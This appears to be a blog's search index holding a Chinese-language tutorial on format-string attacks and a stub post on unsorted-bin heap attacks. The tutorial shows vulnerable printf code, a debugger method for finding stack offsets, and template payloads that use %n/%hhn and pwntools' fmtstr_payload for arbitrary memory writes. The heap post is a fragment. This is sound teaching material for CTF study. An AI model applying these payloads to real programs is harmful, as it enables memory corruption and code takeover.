<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>404</title>
    <url>//404.html</url>
    <content><![CDATA[<hr>
<div align=center align=mid style="font-size:4em">Page Not Found</div>

<hr>
]]></content>
      <tags>
        <tag>404</tag>
      </tags>
  </entry>
  <entry>
    <title>Format-String Attack</title>
    <url>/2022/03/18/fmtstr_attack/</url>
    <content><![CDATA[<h2 id="1-漏洞样式"><a href="#1-漏洞样式" class="headerlink" title="1. 漏洞样式"></a>1. 漏洞样式</h2><p>通常情况下漏洞程序样式：  </p>
<div align=center>Table 1. Vulnerable Code Demo</div>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">char buffer[1024];</span><br><span class="line">gets(buffer, 1024);</span><br><span class="line">printf(buffer);</span><br></pre></td></tr></table></figure>

<p>字符串 <strong>buffer</strong> 可控且作为 <strong>printf</strong> 的第一个参数。当其中包含 <strong>格式化字符(例如%s, %d, %p等)</strong> 时，栈上的内容就会被当做printf的第2个、第3个参数等被输出。</p>
<h2 id="2-利用方法"><a href="#2-利用方法" class="headerlink" title="2. 利用方法"></a>2. 利用方法</h2><h3 id="2-1-确定偏移"><a href="#2-1-确定偏移" class="headerlink" title="2.1 确定偏移"></a>2.1 确定偏移</h3><p> 输入字符串（即Table 1中<strong>buffer</strong>）在栈上的偏移，即<strong>buffer</strong>被<strong>printf</strong>当做参数时，作为第几个参数。参数序号从0开始： printf(arg0, arg1, arg2, …, argn); 第10参数即表示arg10</p>
<ul>
<li>步骤1. <strong>break printf</strong> ；即在 <strong>printf</strong> 下断点  </li>
<li>步骤2. 输入 <strong>%p%p%p%p</strong> 等特殊字符    </li>
<li>步骤3. 在  <strong>printf</strong> 函数断点，使用 <strong>stack</strong> 命令查看栈。找到 <strong>%p%p%p%p</strong> 特殊字符串在栈上的位置。如Figure 1所示。<br><img src="https://s2.loli.net/2022/03/18/vqXDrI3Z5m4CHRE.png"><div align=center>Figure 1. printf stack illustration</div>
需注意图中①断点在**printf**入口，已跳转到**printf** 但尚未执行**printf**中指令（尤其是栈指令，否则栈布局会改变）；注意图中② **0b** 即字符串 **%p%p%p%p** 距离栈顶( **esp** )的偏移为 **11**；由于在 **esp + 0** 的位置存放函数返回地址。因此 **%p%p%p%p** 字符串实际上位于 ***栈上*** 第 **10** 个参数。</li>
<li>步骤4. 根据不同架构确定 <strong>buffer</strong> 在 <strong>printf</strong> 函数参数的序号。参考<a href="https://www.laruence.com/2008/04/01/116.html"><strong>函数调用约定</strong></a>。<ul>
<li>a). x86架构<br>  x86架构的函数参数全部通过栈传递， 因此 <strong>buffer</strong> 是 <strong>printf</strong> 的第<strong>10</strong>个参数。       </li>
<li>b). x64架构<br>  x64传参顺序为rdi, rsi, rdx, rcx, r8, r9; 之后才使用栈传参。因此若 <strong>Figure 1</strong> 在x64架构中，<strong>buffer</strong>对应的是<strong>printf</strong>函数的第（0xb + 6 - 1)&#x3D; 16 个参数(参数序号从0开始，0，1，2，…, 16)。</li>
</ul>
</li>
</ul>
<h3 id="2-2-实现任意地址写"><a href="#2-2-实现任意地址写" class="headerlink" title="2.2 实现任意地址写"></a>2.2 实现任意地址写</h3><p>往 <strong>任意目标地址(记为target_address)</strong> 中写入 <strong>任意值(记为target_value)</strong> 。     </p>
<ul>
<li>1). 任意值的控制：通过格式化字符串 <strong>%Mc</strong> 其中 <strong>M&#x3D;target_value</strong>来操控</li>
<li>2). 任意地址的控制：将目标地址(<strong>target_address</strong>)写入<strong>buffer</strong>字符串中；并通过格式化字符串 <strong>%N$n</strong>来指定将 <em><strong>当前printf已经输字符个数</strong></em> 写入到第 <strong>N</strong> 个参数指定的地址中。其中 <strong>N</strong>即为’使用<strong>2.1</strong>中方法确定的‘’在<strong>buffer</strong>字符串中的‘’<strong>target_address</strong>在栈上的位置对应的<strong>printf</strong>的参数序号‘。(该处使用’’分句停顿帮助阅读)</li>
</ul>
<p>例如： </p>
<h4 id="2-2-1-当target-value-较小时，直接写入"><a href="#2-2-1-当target-value-较小时，直接写入" class="headerlink" title="2.2.1 当target_value 较小时，直接写入"></a>2.2.1 当<strong>target_value</strong> 较小时，直接写入</h4><p>假如buffer字符串位于printf第10个参数的位置(即arg10、即printf栈0xb(10+1)参数位）</p>
<div align=center>Table 2. Payload Demo 1</div>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// 写4到target_address</span><br><span class="line">payload1 = p32(target_address) + b&#x27;%10$n\0&#x27;</span><br></pre></td></tr></table></figure>


<p>其中：<br>payload1实现写4(p32为4byte)到target_address</p>
<div align=center>Table 3. Payload Demo 2</div>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">payload2 = b&#x27;%13$n&#x27; + b&#x27;%100c&#x27; </span><br><span class="line">payload2 = payload2.ljust(12, b&#x27;a&#x27;)</span><br><span class="line">payload2 += p32(target_address)</span><br></pre></td></tr></table></figure>

<p>payload2实现写100到target_address, 此处由于target_adress没有写在字符串的开头，因此需要重新计算在栈上的偏移：字符串开头位于arg10处，字符串中target_address之前有12个字符即占3个参数位，因此target_address对应的参数位为13</p>
<h4 id="2-2-2-当target-value太大时，分字节写入"><a href="#2-2-2-当target-value太大时，分字节写入" class="headerlink" title="2.2.2 当target_value太大时，分字节写入"></a>2.2.2 当target_value太大时，分字节写入</h4><p>假如buffer字符串位于printf第10个参数的位置(即arg10、即printf栈0xb(10+1)参数位）；且需要向<strong>target_address</strong> 中写入的<strong>target_value</strong>为<em><strong>0xbaedbeef</strong></em>。  </p>
<pre><code>实际上就是令：
*(int8*)target_address = 0xef = 239
*(int8*)(target_address + 1) = 0xbe = 190
*(int8*)(target_address + 2) = 0xed = 237
*(int8*)(target_address + 3) = 0xba = 186
</code></pre>
<p>这种情况下使用 <strong>%N$hhn</strong> 向目标地址写入<strong>int8</strong>宽度值 和 使用 <strong>%N$hn</strong> 向目标地址写入<strong>int16</strong>宽度值，将会非常有用。</p>
<p>那么可以使用如下payload实现：    </p>
<div align=center>Table 4. Payload Demo 3</div>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">payload = p32(target_address)          //arg10</span><br><span class="line">payload += p32(target_address + 1)     //arg11</span><br><span class="line">payload += p32(target_address + 2)     //arg12</span><br><span class="line">payload += p32(target_address + 3)     //arg13</span><br><span class="line">//已有16byte输出；写入时从小到大写；即186-&gt;190-&gt;237-&gt;239</span><br><span class="line">// 186 - 16 = 170</span><br><span class="line">payload += b&quot;%170c%13$hhn&quot;</span><br><span class="line">// 190 - 186 = 4</span><br><span class="line">payload += b&quot;%4c%11$hhn&quot;</span><br><span class="line">// 237 - 190 = 47</span><br><span class="line">payload += b&quot;%47c%12$hhn&quot;</span><br><span class="line">// 239 - 237 = 2</span><br><span class="line">payload += b&quot;%2c%10$hhn&quot;</span><br></pre></td></tr></table></figure>

<h4 id="2-2-3-使用pwnlib的fmtstr-payload函数自动构造payload"><a href="#2-2-3-使用pwnlib的fmtstr-payload函数自动构造payload" class="headerlink" title="2.2.3 使用pwnlib的fmtstr_payload函数自动构造payload"></a>2.2.3 使用<strong>pwnlib</strong>的<strong>fmtstr_payload</strong>函数自动构造payload</h4><p>示例如下：</p>
<div align=center>Table 5. Payload Demo 4: fmtstr_payload</div>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from pwnlib.util import misc</span><br><span class="line">//payload = fmtstr_payload(10, &#123;0x804c044: 0x1&#125;)</span><br><span class="line">payload = fmtstr_payload(10, &#123;target_address: target_value&#125;)</span><br><span class="line">io.send(payload)</span><br></pre></td></tr></table></figure>

<h2 id="2-注意事项"><a href="#2-注意事项" class="headerlink" title="2. 注意事项"></a>2. 注意事项</h2><h2 id="3-原理说明"><a href="#3-原理说明" class="headerlink" title="3. 原理说明"></a>3. 原理说明</h2><p>参考：<br><a href="https://ctf-wiki.org/pwn/linux/user-mode/fmtstr/fmtstr-intro/">fmtstr_attack on ctf-wiki</a></p>
]]></content>
      <categories>
        <category>Format String</category>
      </categories>
      <tags>
        <tag>Format String</tag>
      </tags>
  </entry>
  <entry>
    <title>test</title>
    <url>/2022/03/09/test/</url>
    <content><![CDATA[<h2 id="Unsorted-bin-Attack"><a href="#Unsorted-bin-Attack" class="headerlink" title="Unsorted-bin Attack"></a><dir align=center>Unsorted-bin Attack</h2><h3 id="1-Unsorted-bin"><a href="#1-Unsorted-bin" class="headerlink" title="1. Unsorted-bin"></a>1. Unsorted-bin</h3><table>
<thead>
<tr>
<th>prev_size</th>
<th>chunk_size</th>
</tr>
</thead>
<tbody><tr>
<td>fd</td>
<td>bk</td>
</tr>
</tbody></table>
<pre><code>|
</code></pre>
<h3 id="2-unsorted-bin-Leak"><a href="#2-unsorted-bin-Leak" class="headerlink" title="2. unsorted-bin Leak"></a>2. unsorted-bin Leak</h3><p>当chunk被free到unsorted-bin中， 其列表如下：</p>
<p>【av(unsorted)】-&gt;A</p>
]]></content>
  </entry>
</search>
